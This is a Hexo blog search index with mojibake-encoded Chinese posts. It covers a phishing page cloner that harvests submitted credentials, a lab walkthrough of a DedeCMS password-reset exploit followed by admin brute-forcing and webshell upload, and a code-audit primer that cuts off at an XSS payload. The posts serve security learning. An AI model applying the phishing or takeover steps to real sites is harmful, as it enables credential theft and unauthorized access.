<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ä¸€æ¬¾webé’“é±¼ç½‘é¡µç”Ÿæˆå™¨</title>
    <link href="/2025/03/18/%E4%B8%80%E6%AC%BEweb%E9%92%93%E9%B1%BC%E7%BD%91%E9%A1%B5%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <url>/2025/03/18/%E4%B8%80%E6%AC%BEweb%E9%92%93%E9%B1%BC%E7%BD%91%E9%A1%B5%E7%94%9F%E6%88%90%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>é¡¹ç›®åœ°å€ï¼š</strong></p><p><strong><a href="https://github.com/junyibb/web_fishing_go">https://github.com/junyibb/web_fishing_go</a></strong></p><p><strong>ä¸€æ¬¾webå…‹éš†ç½‘é¡µç”Ÿæˆï¼Œå¯ç”¨äºç½‘ç»œå®‰å…¨webç½‘é¡µé’“é±¼æµ‹è¯•</strong></p><h5 id="å·²å¼€æºï¼ŒæœŸå¾…å„ä½äºŒå¼€åŠ é­”æ”¹ã€‚"><a href="#å·²å¼€æºï¼ŒæœŸå¾…å„ä½äºŒå¼€åŠ é­”æ”¹ã€‚" class="headerlink" title="å·²å¼€æºï¼ŒæœŸå¾…å„ä½äºŒå¼€åŠ é­”æ”¹ã€‚"></a>å·²å¼€æºï¼ŒæœŸå¾…å„ä½äºŒå¼€åŠ é­”æ”¹ã€‚</h5><hr><h4 id="é¡µé¢æˆªå›¾"><a href="#é¡µé¢æˆªå›¾" class="headerlink" title="é¡µé¢æˆªå›¾"></a>é¡µé¢æˆªå›¾</h4><p><img src="/image1/1.png" alt="1"></p><h2 id="ğŸ“Œ-1-ç›®å½•ç»“æ„"><a href="#ğŸ“Œ-1-ç›®å½•ç»“æ„" class="headerlink" title="ğŸ“Œ 1. ç›®å½•ç»“æ„"></a><strong>ğŸ“Œ 1. ç›®å½•ç»“æ„</strong></h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">web_fishing_go<span class="hljs-symbol">/</span><br>â”‚â”€â”€ main.py           <span class="hljs-comment"># ç¨‹åºä¸»å…¥å£</span><br>â”‚â”€â”€ gui.py            <span class="hljs-comment"># GUI ç›¸å…³ä»£ç </span><br>â”‚â”€â”€ downloader.py     <span class="hljs-comment"># è´Ÿè´£ç½‘é¡µä¸‹è½½</span><br>â”‚â”€â”€ parser.py         <span class="hljs-comment"># è§£æå’Œå¤„ç† HTML/CSS/JS</span><br>â”‚â”€â”€ utils.py          <span class="hljs-comment"># å·¥å…·å‡½æ•°</span><br>â”‚â”€â”€ config.py         <span class="hljs-comment"># é…ç½®æ–‡ä»¶</span><br>â”‚â”€â”€ output<span class="hljs-symbol">/</span>           <span class="hljs-comment"># å­˜æ”¾å…‹éš†åçš„ç½‘é¡µ</span><br>â””â”€â”€ requirements.txt  <span class="hljs-comment"># ä¾èµ–åŒ…</span><br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ“Œ-2-ä½¿ç”¨æ•™ç¨‹"><a href="#ğŸ“Œ-2-ä½¿ç”¨æ•™ç¨‹" class="headerlink" title="ğŸ“Œ 2. ä½¿ç”¨æ•™ç¨‹"></a><strong>ğŸ“Œ 2. ä½¿ç”¨æ•™ç¨‹</strong></h2><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><h3 id="1ã€-ç›´æ¥ä¸‹è½½æ‰“åŒ…çš„EXE"><a href="#1ã€-ç›´æ¥ä¸‹è½½æ‰“åŒ…çš„EXE" class="headerlink" title="1ã€ ç›´æ¥ä¸‹è½½æ‰“åŒ…çš„EXE"></a><strong>1ã€ ç›´æ¥ä¸‹è½½æ‰“åŒ…çš„EXE</strong></h3><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>1ã€å®‰è£…ä¾èµ–ã€‚</p><p>2ã€è¿è¡Œè„šæœ¬ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pip install requirements<span class="hljs-selector-class">.txt</span><br>python <span class="hljs-selector-tag">main</span>.py<br></code></pre></td></tr></table></figure><h2 id="ğŸ“Œ-3-å·¥å…·å®æµ‹"><a href="#ğŸ“Œ-3-å·¥å…·å®æµ‹" class="headerlink" title="ğŸ“Œ 3. å·¥å…·å®æµ‹"></a><strong>ğŸ“Œ 3. å·¥å…·å®æµ‹</strong></h2><h3 id="1ã€å…‹éš†å®Œæ¯•"><a href="#1ã€å…‹éš†å®Œæ¯•" class="headerlink" title="1ã€å…‹éš†å®Œæ¯•"></a>1ã€å…‹éš†å®Œæ¯•</h3><p><img src="/image1/2.png" alt="2"></p><h3 id="2ã€ä½¿ç”¨apacheæˆ–è€…nginxéƒ½å¯ä»¥ï¼Œä½†æ˜¯PHPéœ€5-6ï¼Œæˆ–æ›´ä½ç‰ˆæœ¬"><a href="#2ã€ä½¿ç”¨apacheæˆ–è€…nginxéƒ½å¯ä»¥ï¼Œä½†æ˜¯PHPéœ€5-6ï¼Œæˆ–æ›´ä½ç‰ˆæœ¬" class="headerlink" title="2ã€ä½¿ç”¨apacheæˆ–è€…nginxéƒ½å¯ä»¥ï¼Œä½†æ˜¯PHPéœ€5.6ï¼Œæˆ–æ›´ä½ç‰ˆæœ¬"></a>2ã€ä½¿ç”¨apacheæˆ–è€…nginxéƒ½å¯ä»¥ï¼Œä½†æ˜¯PHPéœ€5.6ï¼Œæˆ–æ›´ä½ç‰ˆæœ¬</h3><p><img src="/image1/4.png" alt="4"></p><h3 id="3ã€å¯ä»¥çœ‹åˆ°å½“ç‚¹å‡»ç™»å½•ä¼šæŠ“å–POSTçš„å†…å®¹ã€‚"><a href="#3ã€å¯ä»¥çœ‹åˆ°å½“ç‚¹å‡»ç™»å½•ä¼šæŠ“å–POSTçš„å†…å®¹ã€‚" class="headerlink" title="3ã€å¯ä»¥çœ‹åˆ°å½“ç‚¹å‡»ç™»å½•ä¼šæŠ“å–POSTçš„å†…å®¹ã€‚"></a>3ã€å¯ä»¥çœ‹åˆ°å½“ç‚¹å‡»ç™»å½•ä¼šæŠ“å–POSTçš„å†…å®¹ã€‚</h3><h3 id="4ã€å¹¶å¼¹å‡ºé”™è¯¯ï¼Œç‚¹å‡»é‡è¯•ä¼šè·³è½¬åˆ°å…‹éš†æ—¶è‡ªå®šä¹‰çš„ç½‘å€ã€‚"><a href="#4ã€å¹¶å¼¹å‡ºé”™è¯¯ï¼Œç‚¹å‡»é‡è¯•ä¼šè·³è½¬åˆ°å…‹éš†æ—¶è‡ªå®šä¹‰çš„ç½‘å€ã€‚" class="headerlink" title="4ã€å¹¶å¼¹å‡ºé”™è¯¯ï¼Œç‚¹å‡»é‡è¯•ä¼šè·³è½¬åˆ°å…‹éš†æ—¶è‡ªå®šä¹‰çš„ç½‘å€ã€‚"></a>4ã€å¹¶å¼¹å‡ºé”™è¯¯ï¼Œç‚¹å‡»é‡è¯•ä¼šè·³è½¬åˆ°å…‹éš†æ—¶è‡ªå®šä¹‰çš„ç½‘å€ã€‚</h3><p><img src="/image1/7.png" alt="7"></p><h3 id="5ã€å¯ä»¥çœ‹åˆ°å·²ç»è·³è½¬åˆ°è‡ªå®šä¹‰çš„ç½‘å€æ¥äº†ã€‚"><a href="#5ã€å¯ä»¥çœ‹åˆ°å·²ç»è·³è½¬åˆ°è‡ªå®šä¹‰çš„ç½‘å€æ¥äº†ã€‚" class="headerlink" title="5ã€å¯ä»¥çœ‹åˆ°å·²ç»è·³è½¬åˆ°è‡ªå®šä¹‰çš„ç½‘å€æ¥äº†ã€‚"></a>5ã€å¯ä»¥çœ‹åˆ°å·²ç»è·³è½¬åˆ°è‡ªå®šä¹‰çš„ç½‘å€æ¥äº†ã€‚</h3><p><img src="/image1/8.png" alt="8"></p><h3 id="6ã€å›åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸç”Ÿæˆtxtï¼Œå¾—åˆ°è´¦å·å¯†ç "><a href="#6ã€å›åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸç”Ÿæˆtxtï¼Œå¾—åˆ°è´¦å·å¯†ç " class="headerlink" title="6ã€å›åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸç”Ÿæˆtxtï¼Œå¾—åˆ°è´¦å·å¯†ç "></a>6ã€å›åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸç”Ÿæˆtxtï¼Œå¾—åˆ°è´¦å·å¯†ç </h3><p><img src="/image1/9.png" alt="9"></p><p><img src="/image1/10.png" alt="10"></p><h2 id="æœ¬å·¥å…·ä»…ä¾›å­¦ä¹ å’Œæµ‹è¯•ä½¿ç”¨ã€‚ä½¿ç”¨æœ¬å·¥å…·æ‰€äº§ç”Ÿçš„ä¸€åˆ‡æ³•å¾‹è´£ä»»ç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…"><a href="#æœ¬å·¥å…·ä»…ä¾›å­¦ä¹ å’Œæµ‹è¯•ä½¿ç”¨ã€‚ä½¿ç”¨æœ¬å·¥å…·æ‰€äº§ç”Ÿçš„ä¸€åˆ‡æ³•å¾‹è´£ä»»ç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…" class="headerlink" title="æœ¬å·¥å…·ä»…ä¾›å­¦ä¹ å’Œæµ‹è¯•ä½¿ç”¨ã€‚ä½¿ç”¨æœ¬å·¥å…·æ‰€äº§ç”Ÿçš„ä¸€åˆ‡æ³•å¾‹è´£ä»»ç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…!"></a>æœ¬å·¥å…·ä»…ä¾›å­¦ä¹ å’Œæµ‹è¯•ä½¿ç”¨ã€‚ä½¿ç”¨æœ¬å·¥å…·æ‰€äº§ç”Ÿçš„ä¸€åˆ‡æ³•å¾‹è´£ä»»ç”±ä½¿ç”¨è€…è‡ªè¡Œæ‰¿æ‹…!</h2>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>githubé¡¹ç›®</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»‡æ¢¦cmsä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹å®æˆ˜</title>
    <link href="/2024/12/14/%E7%BB%87%E6%A2%A6cms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E5%AE%9E%E6%88%98/"/>
    <url>/2024/12/14/%E7%BB%87%E6%A2%A6cms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h3 id="é¶æ ‡"><a href="#é¶æ ‡" class="headerlink" title="é¶æ ‡"></a>é¶æ ‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"> IPï¼š  <span class="hljs-number">192.168</span>.<span class="hljs-number">84.127</span><br>åŸŸåï¼š www.dede.com<br></code></pre></td></tr></table></figure><h5 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">é¦–å…ˆç”¨nmapæ‰«æIPå¼€æ”¾å“ªäº›ç«¯å£ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨ï¼Œä¾‹å¦‚<span class="hljs-number">22</span>ç«¯å£è¿œç¨‹ç™»å½•ï¼Œ<span class="hljs-number">21</span>ç«¯å£ftpæ–‡ä»¶ä¼ è¾“ç­‰ã€‚<br></code></pre></td></tr></table></figure><p><img src="/image/1.png" alt="1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">è¿˜æœ‰ç”¨å¾¡å‰‘æ‰«æä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰æ•æ„Ÿç›®å½•ï¼Œå’Œæºç ä¿¡æ¯<br>æ‰¾åˆ°äº†robots.txtæ•æ„Ÿç›®å½•å’Œç½‘ç«™æºç <br></code></pre></td></tr></table></figure><p><img src="/image/2.png" alt="2"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆ‘ä»¬æ‰“å¼€robots.txtæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªtest1,å¯†ç æœªçŸ¥ã€‚<br></code></pre></td></tr></table></figure><p><img src="/image/3-16832188835253.png" alt="3"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æ‰“å¼€ä¸‹è½½å¥½çš„æºç ï¼Œåªå‘ç°äº†ï¼Œè®©æˆ‘æœç´¢<span class="hljs-title function_ invoke__">nday</span>(ä»¥åŠå…¬å¸ƒçš„æ¼æ´)<br></code></pre></td></tr></table></figure><p><img src="/image/4.png" alt="4"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">å¾ˆå¥½ï¼Œé‚£æˆ‘å°±å»æ‰¾ç›¸å…³æ¼æ´ï¼Œå…ˆä¸æ€¥ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹èƒ½ä¸èƒ½æ³¨å†Œï¼Œç™»å½•<br>ç„¶ååªå‘ç°äº†ä¸èƒ½æ­£å¸¸ï¼Œåªèƒ½å‰å°ç”¨æˆ·ç™»å½•ã€‚<br></code></pre></td></tr></table></figure><p><img src="/image/5.png" alt="5"></p><p><img src="/image/6.png" alt="6"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">é€šè¿‡æœç´¢ç»‡æ¢¦cmsç‰ˆæœ¬å‘ç°äº†ä»»æ„ç”¨æˆ·å¯†ç ä¿®æ”¹æ¼æ´<br>ç‚¹å‡»å¿˜è®°å¯†ç ï¼Œè´¦å·æ˜¯test1,å¯†ç éšä¾¿å¡«ï¼ŒBPæŠ“åŒ…<br></code></pre></td></tr></table></figure><p><img src="/image/7.png" alt="7"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">å‘åˆ°é‡æ”¾æ¨¡å—<br>å°†BPçš„åŒ…æ”¹äº†<br></code></pre></td></tr></table></figure><p><img src="/image/8.png" alt="8"></p><p><img src="/image/0.png" alt="0"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">å°†IDæ”¹ä¸º<span class="hljs-number">2</span>ï¼Œå°†useridæ”¹ä¸ºtest1<br></code></pre></td></tr></table></figure><p><img src="/image/9.png" alt="9"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">å¾—åˆ°äº†<br>http:<span class="hljs-comment">//www.dede.com/member/resetpassword.php?dopost=getpasswd&amp;amp;id=2&amp;amp;key=BvCQSSGz</span><br></code></pre></td></tr></table></figure><p><img src="/image/11.png" alt="11"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">è¦æŠŠ&amp;amp;å»æ‰ï¼Œæ³¨æ„ï¼Œè¿™æ˜¯é‡ç‚¹ï¼Œä¸ç„¶ä¸€ç›´æ˜¾ç¤ºéæ³•è¯·æ±‚<br>æ”¹äº†å°±å˜æˆè¿™æ ·äº†<br>http:<span class="hljs-comment">//www.dede.com/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=BvCQSSGz</span><br></code></pre></td></tr></table></figure><p><img src="/image/12.png" alt="12"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆåŠŸè¿›å…¥test1çš„åå°<br></code></pre></td></tr></table></figure><p><img src="/image/13.png" alt="13"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">Test1åå°å•¥éƒ½æ²¡æœ‰ï¼Œæˆ‘ä»¬å‘ç°é™¤äº†æˆ‘ä»¬test1è¿˜è¦test2,test3,test4<br>ç‚¹è¿›test4æŸ¥çœ‹å‘ç°äº†å±…ç„¶å¯ä»¥è¿›å…¥ä»–çš„ç©ºé—´ã€‚ä½†æ˜¯ä»–ä¸æ˜¯ç®¡ç†å‘˜ã€‚<br></code></pre></td></tr></table></figure><p><img src="/image/14.png" alt="14"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆ‘ä»¬æ³¨æ„äº†ï¼Œid=<span class="hljs-number">2</span>æ”¹çš„æ˜¯æˆ‘test1ï¼Œé‚£id=<span class="hljs-number">1</span>å²‚ä¸æ˜¯ç®¡ç†å‘˜çš„è´¦å·ï¼Ÿæˆ‘ä»¬å›åˆ°äº†bpé‚£æ®µã€‚<br></code></pre></td></tr></table></figure><p><img src="/image/18.png" alt="18"></p><p><img src="/image/19.png" alt="19"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆåŠŸä¿®æ”¹äº†ç®¡ç†å‘˜å¯†ç <br>æˆ‘ä»¬å°è¯•ç™»å½•<br></code></pre></td></tr></table></figure><p><img src="/image/20.png" alt="20"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">å‘ç°ä¸å…è®¸å‰å°ç™»å½•<br>å¾—åˆ°äº†hejunæ˜¯ç®¡ç†å‘˜è´¦å·åï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åœ¨ç©ºé—´ï¼Œè¯•è¯•æœªæˆæƒè®¿é—®ç©ºé—´ï¼Œå‘ç°æˆåŠŸã€‚<br></code></pre></td></tr></table></figure><p><img src="/image/15.png" alt="15"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">åå°æ˜¯hejun,ä½†æ˜¯åå°ç›®å½•æˆ‘ä»¬ä¸çŸ¥é“ã€‚<br>æˆ‘ä»¬å¯ä»¥ç”¨dedecms-masterå¿«é€Ÿæ‰«ædedecmsåå°ç›®å½•ã€‚<br>é¡¹ç›®åœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/AAHOne/dedecms</span><br></code></pre></td></tr></table></figure><p><img src="/image/16.png" alt="16"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆ‘ä»¬æŠŠä»–ä¸‹è½½å¥½ï¼Œè¿›å…¥æˆ‘ä»¬çš„kali<br>æˆåŠŸçˆ†å‡ºçš„ä»–çš„åå°ç™»å½•åœ°å€<br>http:<span class="hljs-comment">//www.dede.com/hejunwebxxe</span><br></code></pre></td></tr></table></figure><p><img src="/image/17.png" alt="17"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆ‘ä»¬è¿›å…¥åå°ï¼Œè´¦å·hejun,å¯†ç æ˜¯æˆ‘ä»¬åˆšæ‰æ”¹äº†<span class="hljs-number">123123</span><br>å¥½å®¶ä¼™ï¼Œå¯†ç é”™è¯¯ï¼Œé‚£åå°è´¦å·åº”è¯¥æ˜¯ä¸ä¸€æ ·çš„<br></code></pre></td></tr></table></figure><p><img src="/image/21.png" alt="21"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æ²¡äº‹ï¼Œæˆ‘ä»¬æ‰“å¼€bpæŠ“åŒ…ï¼Œå¯ä»¥å°è¯•BPçˆ†ç ´<br></code></pre></td></tr></table></figure><p><img src="/image/22.png" alt="22"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">BP</span>é…ç½®å¥½éªŒè¯ç çˆ†ç ´<br></code></pre></td></tr></table></figure><p><img src="/image/23.png" alt="23"></p><p><img src="/image/24.png" alt="24"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ç”¨ç‹™å‡»æ‰‹æ¨¡å¼<br></code></pre></td></tr></table></figure><p><img src="/image/25.png" alt="25"></p><p><img src="/image/26.png" alt="26"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆåŠŸçˆ†å‡ºå¯†ç ï¼Œä¸ºadmin888<br></code></pre></td></tr></table></figure><p><img src="/image/27.png" alt="27"></p><p><img src="/image/28.png" alt="28"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">å¾ˆå¥½ï¼Œæˆ‘ä»¬ç›´æ¥ç¼–å†™ä¸€å¥è¯æœ¨é©¬<br></code></pre></td></tr></table></figure><p><img src="/image/29.png" alt="29"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¸Šä¼ æˆåŠŸï¼Œæ²¡æœ‰è¿‡æ»¤<br></code></pre></td></tr></table></figure><p><img src="/image/30.png" alt="30"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ç›´æ¥ä¸Šä¸­å›½èšå‰‘è¿æ¥ï¼ŒæˆåŠŸè¿æ¥ã€‚<br></code></pre></td></tr></table></figure><p><img src="/image/31.png" alt="31"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆåŠŸæ‹¿åˆ°flagï¼Œä½†æ˜¯è¦è§£ç <br></code></pre></td></tr></table></figure><p><img src="/image/32.png" alt="32"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">åªæ˜¯é€šè¿‡äº†base64åŠ å¯†äº†ä¸¤æ¬¡<br>è§£å‡ºæ¥äº†<br></code></pre></td></tr></table></figure><p><img src="/image/33.png" alt="33"></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»£ç å®¡è®¡</title>
    <link href="/2024/10/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/10/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯ä»£ç å®¡è®¡"><a href="#ä»€ä¹ˆæ˜¯ä»£ç å®¡è®¡" class="headerlink" title="ä»€ä¹ˆæ˜¯ä»£ç å®¡è®¡"></a>ä»€ä¹ˆæ˜¯ä»£ç å®¡è®¡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">ç”±å…·å¤‡ä¸°å¯Œçš„ç¼–ç ç»éªŒå¹¶å¯¹å®‰å…¨ç¼–ç åŠåº”ç”¨å®‰å…¨å…·æœ‰å¾ˆæ·±åˆ»ç†è§£çš„å®‰å…¨æœåŠ¡äººå‘˜æ ¹æ®ä¸€å®šçš„ç¼–ç è§„èŒƒå’Œæ ‡å‡†,é’ˆå¯¹åº”ç”¨ç¨‹åºæºä»£ç ,ä»ç»“æ„ã€è„†å¼±æ€§ä»¥åŠç¼ºé™·ç­‰æ–¹é¢è¿›è¡Œå®¡æŸ¥,æœ€ç»ˆè¾“å‡ºä»£ç å®¡è®¡æŠ¥å‘Š,å®Œå–„åº”ç”¨ç¨‹åº,æå‡è‡ªèº«å®‰å…¨æ°´å¹³æ€ä¹ˆåšä»£ç å®¡è®¡?(ä»å‘ç°å®‰å…¨æ¼æ´ç»´åº¦å‡ºå‘)<br>å…·å¤‡å“ªäº›çŸ¥è¯†ç‚¹(è¿è¡Œç¯å¢ƒæ­å»ºã€ç†Ÿæ‚‰å¼€å‘è¯­è¨€ã€å„ç±»å‡½æ•°åº”ç”¨)<br>äº†è§£å¸¸ç”¨æ¼æ´äº§ç”Ÿæˆå› (SQLã€xssã€ä¸Šä¼ æ¼æ´ã€SSRFã€ä»£ç æ‰§è¡Œã€CSRFç­‰ç­‰)æ¼æ´è°ƒè¯•(æ–­ç‚¹è¾“å‡ºã€å˜é‡è·Ÿè¸ªã€æ¼æ´å…³é”®å‡½æ•°)<br>é«˜çº§åº”ç”¨æ¼æ´<span class="hljs-comment">// (å¥‡æŠ€æ·«å·§åº”ç”¨:äºŒæ¬¡æ³¨å…¥ã€æˆªæ–­æ³¨å…¥ã€æ¡ä»¶ç«äº‰ã€äºŒæ¬¡æ”»å‡»ã€é»‘ç™½ç›’fuzzç­‰)</span><br>Pocç¼–å†™(æ•°æ®åŒ…æ„é€ ã€è¯­è¨€ç±»å‹)<br></code></pre></td></tr></table></figure><h3 id="èƒ½åŠ›"><a href="#èƒ½åŠ›" class="headerlink" title="èƒ½åŠ›"></a>èƒ½åŠ›</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">è”æƒ³èƒ½åŠ›<br>å¼€å‘èƒ½åŠ›<br><span class="hljs-comment">// å¯»æ‰¾ç­”æ¡ˆçš„èƒ½åŠ›</span><br><span class="hljs-comment">// æŠ“ä½é‡ç‚¹çš„èƒ½åŠ›,èƒ½å¤Ÿå¿½ç•¥æ— æ•ˆä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">ä»£ç å®¡è®¡æœ‰<span class="hljs-number">2</span>ç§å¤§ä½“æ€è·¯<br><span class="hljs-number">1</span>.ç›´æ¥é€šè¿‡æ‰«æå™¨æ‰«æå‡ºæ¥æ•æ„Ÿçš„å‡½æ•°,ç„¶åé€†æ¨<br><span class="hljs-number">2</span>.è®¿é—®ç½‘ç«™,ç„¶åæ ¹æ®ç½‘ç«™çš„ç»“æ„æ¨æµ‹å¯èƒ½å‡ºç°çš„é—®é¢˜<br>  <br><span class="hljs-number">1</span>.å¿«é€Ÿå®šä½ <span class="hljs-comment">// é»‘ï¼ˆé»‘ç›’æµ‹è¯•ï¼‰åŠ ç™½ï¼ˆç™½ç›’æµ‹è¯•ï¼‰</span><br>      ï¼ˆåŠŸèƒ½ç‚¹ï¼‰    ï¼ˆå¯¹åº”æºä»£ç ï¼‰<br><span class="hljs-number">2</span>. ç™½ç›’å®¡è®¡ <span class="hljs-comment">//(æŸ¥æ‰¾æ•æ„Ÿå‡½æ•° insert select scriptcurl exec move upload file system)</span><br>    ï¼ˆæµªè´¹æ—¶é—´ï¼Œæœ‰ä¸€å®šæ”¶è·ï¼‰<br><span class="hljs-number">3</span>. é€šè¯»å…¨æ–‡ ï¼ˆå…¨éƒ¨éƒ½çœ‹ï¼Œæ—¶é—´è€—æ—¶é•¿ï¼Œä½†èƒ½å‘ç°<span class="hljs-number">90</span>%çš„<span class="hljs-number">0</span>dayï¼‰<br></code></pre></td></tr></table></figure><h4 id="zzcmsxssæ¼æ´"><a href="#zzcmsxssæ¼æ´" class="headerlink" title="zzcmsxssæ¼æ´"></a>zzcmsxssæ¼æ´</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;img+src=<span 